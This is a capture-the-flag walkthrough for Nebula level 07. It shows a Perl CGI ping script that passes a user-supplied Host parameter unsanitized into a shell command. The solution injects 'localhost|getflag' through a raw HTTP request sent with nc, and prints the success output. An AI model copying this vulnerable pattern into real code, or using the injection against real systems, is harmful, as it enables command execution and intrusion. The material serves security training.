# Nebula - Level 07

### About ###

>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
>
>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.

### Source code ###

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

### Solution ###

In the source code given, the variable host is directly concatenated without being sanitized first, thus allowing users to inject code into the ping command.

In `/home/flag07` the file `thttpd.conf` contains information about the web server executing the perl script `index.cgi`. This server runs on the same machine and on the port 7007.

`getflag` can be executed with `flag07`'s permissions by sending a simple HTTP request to that server with the `host` variable set to `localhost|getflag`.

```
level07@nebula:~$ printf "GET /index.cgi?Host=localhost%%7Cgetflag\r\nHost: localhost:7007\r\n\r\n" | nc localhost 7007Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
</pre></body></html>
```
